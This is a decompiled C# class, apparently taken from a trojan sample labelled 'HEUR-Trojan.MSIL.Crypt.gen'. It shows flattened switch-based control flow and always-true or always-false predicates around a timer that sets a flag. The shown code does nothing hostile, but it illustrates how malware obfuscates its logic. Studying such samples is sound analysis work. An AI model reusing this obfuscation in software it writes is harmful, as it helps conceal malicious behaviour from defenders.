// Decompiled with JetBrains decompiler
// Type: Tourield.Roles.ExporterFactoryRole
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Collections;
using DebuggerTypeProxyAttrib.Pages;
using System.Runtime.CompilerServices;
using System.Timers;

namespace Tourield.Roles
{
  public class ExporterFactoryRole
  {
    private Timer serializer;
    private GlobalErrorCollection m_Object;
    public bool decorator;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ExporterFactoryRole()
    {
      int num1 = 0;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
            RegistryPagePage.ListMethod();
            num2 = 3;
            break;
          case 1:
          case 3:
            // ISSUE: explicit constructor call
            base.\u002Ector();
            goto case 2;
          case 2:
          case 4:
            this.serializer = new Timer();
            this.decorator = false;
            if (!ExporterFactoryRole.PopAttribute())
            {
              num1 = 5;
              continue;
            }
            goto case 0;
          case 5:
            goto label_7;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ExporterFactoryRole(ref GlobalErrorCollection def)
    {
      int num = 5;
      if (ExporterFactoryRole.PopAttribute())
        ;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.decorator = false;
            this.m_Object = def;
            if (ExporterFactoryRole.AddAttribute())
            {
              num = 6;
              continue;
            }
            goto case 2;
          case 1:
          case 3:
            // ISSUE: explicit constructor call
            base.\u002Ector();
            if (true)
            {
              num = 4;
              continue;
            }
            goto case 5;
          case 2:
          case 4:
            this.serializer = new Timer();
            goto case 0;
          case 5:
            RegistryPagePage.ListMethod();
            num = 3;
            continue;
          case 6:
            goto label_1;
          default:
            num = 0;
            continue;
        }
      }
label_1:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void PrintOrder()
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            this.serializer.Elapsed += new ElapsedEventHandler(this.IncludeOrder);
            int num2 = 4;
            num1 = ExporterFactoryRole.PopAttribute() ? num2 : num2;
            continue;
          case 1:
          case 4:
            this.serializer.Interval = 500.0;
            goto case 3;
          case 3:
            this.serializer.Start();
            num1 = 5;
            continue;
          case 5:
            goto label_6;
          default:
            num1 = 3;
            continue;
        }
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void IncludeOrder(object last, ElapsedEventArgs selection) => this.decorator = true;

    internal static bool AddAttribute() => true;

    internal static bool PopAttribute() => false;
  }
}
